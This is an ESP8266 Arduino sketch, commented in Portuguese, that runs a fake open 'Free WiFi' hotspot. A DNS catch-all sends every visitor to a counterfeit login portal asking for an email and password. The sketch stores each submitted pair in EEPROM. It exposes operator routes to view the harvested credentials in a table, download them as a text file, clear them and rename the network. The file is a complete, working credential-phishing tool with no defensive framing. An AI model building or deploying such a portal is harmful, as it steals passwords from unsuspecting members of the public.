#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>
#include <ArduinoJson.h>

// Configurações iniciais
const char* SSID_NAME = "Free WiFi";
const byte DNS_PORT = 53;
IPAddress APIP(172, 0, 0, 1); // Gateway

DNSServer dnsServer;
ESP8266WebServer webServer(80);
int credentialStart = 30;  // Local de início na EEPROM para armazenar credenciais
int credentialEnd = credentialStart;

void setup() {
  // Configurações da EEPROM
  EEPROM.begin(512);

  // Configuração do AP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  
  // Configuração do Servidor DNS para redirecionar todas as solicitações para o IP do ESP8266
  dnsServer.start(DNS_PORT, "*", APIP);

  // Configuração do Servidor Web
  webServer.onNotFound(handleRoot); // Redireciona todas as solicitações para a página de login
  webServer.on("/", handleRoot);               // Página de login
  webServer.on("/login", handleLogin);         // Captura das credenciais
  webServer.on("/pass", handleShowPasswords);  // Exibe as credenciais armazenadas
  webServer.on("/bssid", handleChangeSSID);    // Troca o SSID
  webServer.on("/postSSID", handlePostedSSID); // Processa a troca de SSID
  webServer.on("/download", handleDownload);   // Rota para download das credenciais
  webServer.on("/clear", HTTP_POST, handleClearPasswords); // Limpa as credenciais
  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}

// Página de login com design melhorado
void handleRoot() {
  String page = "<!DOCTYPE html>"
                "<html lang='pt-br'>"
                "<head>"
                "<meta charset='UTF-8'>"
                "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                "<title>Portal de Acesso à Internet</title>"
                "<style>"
                "body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; color: #495057; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }"
                ".container { max-width: 400px; width: 100%; background: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }"
                ".header { text-align: center; margin-bottom: 20px; }"
                ".header img { max-width: 150px; }" // Aumenta a imagem
                "h1 { font-size: 24px; margin-bottom: 20px; color: #333; }"
                "p { font-size: 16px; margin-bottom: 20px; color: #666; }"
                "label { display: block; margin: 10px 0 5px; font-weight: bold; }"
                "input[type='email'], input[type='password'] { width: 100%; padding: 12px; border: 1px solid #ced4da; border-radius: 4px; box-sizing: border-box; margin-bottom: 15px; }"
                "input[type='submit'] { background-color: #007bff; color: #fff; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 16px; }"
                "input[type='submit']:hover { background-color: #0056b3; }"
                ".footer { text-align: center; margin-top: 20px; font-size: 14px; color: #6c757d; }"
                ".footer a { color: #007bff; text-decoration: none; }"
                ".footer a:hover { text-decoration: underline; }"
                "</style>"
                "</head>"
                "<body>"
                "<div class='container'>"
                "<div class='header'>"
                "<img src='data:image/png;base64, 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' alt='Logo'>"
                "</div>"
                "<h1>Bem-vindo ao Portal de Acesso</h1>"
                "<p>Para continuar usando a internet, faça login com suas credenciais.</p>"
                "<form action='/login' method='POST'>"
                "<label for='email'>Email:</label>"
                "<input type='email' id='email' name='email' required placeholder='Digite seu email'>"
                "<label for='password'>Senha:</label>"
                "<input type='password' id='password' name='password' required placeholder='Digite sua senha'>"
                "<input type='submit' value='Entrar'>"
                "</form>"
                "<div class='footer'>"
                "<p>Ao clicar em 'Entrar', você concorda com nossos <a href='#'>Termos de Serviço</a> e <a href='#'>Política de Privacidade</a>.</p>"
                "</div>"
                "</div>"
                "</body>"
                "</html>";
  webServer.send(200, "text/html", page);
}

// Captura e armazena as credenciais
void handleLogin() {
  String email = webServer.arg("email");
  String password = webServer.arg("password");

  // Cria um objeto JSON para armazenar a entrada
  DynamicJsonDocument doc(1024);
  doc["email"] = email;
  doc["password"] = password;
  String json;
  serializeJson(doc, json);

  // Armazena o JSON na EEPROM
  for (int i = 0; i < json.length(); i++) {
    EEPROM.write(credentialEnd++, json[i]);
  }
  EEPROM.write(credentialEnd++, '\n');
  EEPROM.commit(); // Confirma a gravação dos dados

  webServer.send(200, "text/html", "<h1>Obrigado! Pode continuar navegando.</h1>");
}

// Exibe as credenciais armazenadas
void handleShowPasswords() {
  String page = "<!DOCTYPE html>"
                "<html lang='pt-br'>"
                "<head>"
                "<meta charset='UTF-8'>"
                "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                "<title>Credenciais Armazenadas</title>"
                "<style>"
                "body { font-family: Arial, sans-serif; background-color: #f4f4f4; color: #333; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }"
                "table { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); width: 100%; max-width: 600px; margin: 20px; }"
                "h1 { font-size: 24px; margin-bottom: 20px; color: #333; text-align: center; }"
                "table { width: 100%; border-collapse: collapse; }"
                "th, td { padding: 10px; border: 1px solid #ddd; text-align: left; word-wrap: break-word; }"
                "th { background-color: #007bff; color: #fff; }"
                "tr:nth-child(even) { background-color: #f2f2f2; }"
                "form { display: flex; flex-direction: column; align-items: center; margin: 20px; }"
                "input[type='submit'] { background-color: #007bff; color: #fff; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin-top: 10px; }"
                "input[type='submit']:hover { background-color: #0056b3; }"
                "</style>"
                "</head>"
                "<body>"
                "<h1>Credenciais Armazenadas</h1>"
                "<table>"
                "<tr><th>Email</th><th>Senha</th></tr>";

  // Lê as credenciais da EEPROM e as exibe
  String json;
  for (int i = credentialStart; i < credentialEnd; i++) {
    char c = EEPROM.read(i);
    if (c == '\n') {
      DynamicJsonDocument doc(1024);
      deserializeJson(doc, json);
      String email = doc["email"].as<String>();
      String password = doc["password"].as<String>();
      page += "<tr><td>" + email + "</td><td>" + password + "</td></tr>";
      json = "";
    } else {
      json += c;
    }
  }

  page += "</table>"
          "<form action='/download' method='get'>"
          "<input type='submit' value='Baixar Credenciais'>"
          "</form>"
          "<form action='/clear' method='post'>"
          "<input type='submit' value='Limpar Credenciais'>"
          "</form>"
          "</body></html>";

  webServer.send(200, "text/html", page);
}


// Página para alterar o SSID
void handleChangeSSID() {
  String page = "<!DOCTYPE html>"
                "<html lang='pt-br'>"
                "<head>"
                "<meta charset='UTF-8'>"
                "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                "<title>Alterar SSID</title>"
                "<style>"
                "body { font-family: Arial, sans-serif; background-color: #f4f4f4; color: #333; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }"
                "form { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); width: 300px; text-align: center; }"
                "h1 { font-size: 24px; margin-bottom: 20px; color: #333; }"
                "label { display: block; margin: 10px 0 5px; font-weight: bold; }"
                "input[type='text'] { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; margin-bottom: 15px; }"
                "input[type='submit'] { background-color: #007bff; color: #fff; border: none; padding: 10px; border-radius: 4px; cursor: pointer; width: 100%; }"
                "input[type='submit']:hover { background-color: #0056b3; }"
                "</style>"
                "</head>"
                "<body>"
                "<form action='/postSSID' method='POST'>"
                "<h1>Alterar SSID</h1>"
                "<label for='ssid'>Novo SSID:</label>"
                "<input type='text' id='ssid' name='ssid' required>"
                "<input type='submit' value='Alterar SSID'>"
                "</form>"
                "</body>"
                "</html>";
  webServer.send(200, "text/html", page);
}

// Processa a troca do SSID
void handlePostedSSID() {
  String ssid = webServer.arg("ssid");
  WiFi.softAP(ssid.c_str());
  webServer.send(200, "text/html", "<h1>SSID alterado com sucesso!</h1>");
}

void handleDownload() {
  String textOutput = "";
  String line;
  
  // Ler os dados da EEPROM e formatar o texto
  for (int i = credentialStart; i < credentialEnd; i++) {
    char c = EEPROM.read(i);

    // Adiciona o caractere lido à linha atual
    if (c == '\n') {
      // Linha completa lida
      if (line.length() > 0) {
        DynamicJsonDocument doc(1024);
        deserializeJson(doc, line);
        String email = doc["email"].as<String>();
        String password = doc["password"].as<String>();
        
        // Adiciona a linha formatada ao texto de saída
        textOutput += "login: " + email + "\nsenha: " + password + "\n\n";
        line = ""; // Limpa a linha para o próximo conjunto de credenciais
      }
    } else {
      line += c; // Continua adicionando caracteres à linha atual
    }
  }

  // Adiciona a última linha, se houver
  if (line.length() > 0) {
    DynamicJsonDocument doc(1024);
    deserializeJson(doc, line);
    String email = doc["email"].as<String>();
    String password = doc["password"].as<String>();
    textOutput += "login: " + email + "\nsenha: " + password + "\n\n";
  }

  // Enviar o cabeçalho para download de arquivo txt
  webServer.sendHeader("Content-Disposition", "attachment; filename=credenciais.txt");
  webServer.send(200, "text/plain", textOutput);
}

// Limpa todas as credenciais armazenadas
void handleClearPasswords() {
  // Limpa a EEPROM a partir do local de início
  for (int i = credentialStart; i < credentialEnd; i++) {
    EEPROM.write(i, 0);
  }
  credentialEnd = credentialStart;
  EEPROM.commit(); // Confirma a limpeza dos dados

  webServer.send(200, "text/html", "<h1>Credenciais limpas com sucesso!</h1>");
}
